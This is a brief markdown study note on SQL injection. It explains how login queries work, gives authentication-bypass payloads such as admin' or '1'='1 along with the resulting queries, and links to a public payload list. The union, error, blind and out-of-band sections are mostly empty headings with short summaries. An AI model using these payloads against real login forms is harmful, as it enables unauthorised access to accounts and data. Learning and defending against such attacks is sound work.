# SQL Injection
### Summary
Injection occurs user-input is put into the SQL query string without properly sanitizing or filtering the input
## Common
### Authentication Bypass
For Auth bypass, the query always needs to return true
```sql
# Basic Admin Panel Query String
SELECT * FROM logins WHERE username = 'admin' AND password = 'p@ssw0rd';
# This statement returns True based on the "AND" Statement if both the username and password match the same entry in sql,
# and thus allows the login
```
OR Injection ([Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass))
```sql
# Injected Code
admin' or '1'='1
# Final Query
SELECT * FROM logins WHERE username='admin' OR '1'='1' AND password = 'something';

# Easy way to understand this, AND is evaluated first and will return false, assuming 'something' isn't the password
# When the OR is evaluated, 1=1 is always true, so that will return true.
# NOTE: This will only work with a valid username
```
```sql
# No known username (We need to have an overall true query)
SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password = 'something' OR '1'='1';

# The additional OR statement makes the password field evaluate as true, because 1=1 is always true.
```

## In-Band
### Summary
Output of both the intended and new query are output directly to the screen and can be directly read.
### Union Based
### Error Based
## Blind
### Summary
Output may not printed, so we'll have to use SQL logic to get the output character by character
### Boolean Based
### Time Based
## Out-of-band
### Summary
No direct access to the output, so we have to direct the output to a remote location, like a DNS record, and retrieve it from there.
